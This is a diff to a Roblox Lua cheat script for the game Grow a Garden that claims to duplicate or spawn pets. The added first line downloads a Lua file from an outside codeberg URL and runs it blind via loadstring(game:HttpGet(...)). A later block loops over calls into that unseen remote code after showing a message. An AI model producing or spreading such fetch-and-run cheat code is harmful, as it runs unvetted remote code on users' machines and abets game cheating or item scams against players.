@@ -1,3 +1,5 @@
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.GetPets()
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
@@ -444,6 +446,27 @@ spawnBtn.MouseButton1Click:Connect(function()
 
     task.wait(5)
     errorMsgFrame:Destroy()
+
+    -- After showing success message, spawn the pets as requested
+    -- Parse the correct values for name, kg, and age
+    local function toNumber(val)
+        local n = tonumber(val)
+        if n then return n end
+        -- Try to convert comma to dot (for decimals)
+        if type(val) == "string" then
+            n = tonumber(val:gsub(",", "."))
+            if n then return n end
+        end
+        return 1 -- fallback
+    end
+    local basePetName = getBasePetName(duplicatingPetName)
+    local weight, age = parseWeightAndAgeFromName(duplicatingPetName)
+    local kg = toNumber(weight)
+    local petAge = toNumber(age)
+    local qty = tonumber(duplicatingQty) or 1
+    for i = 1, qty do
+        Spawner.SpawnPet(basePetName, kg, petAge)
+    end
 end)
 
 local WHITELISTED_PETS = {
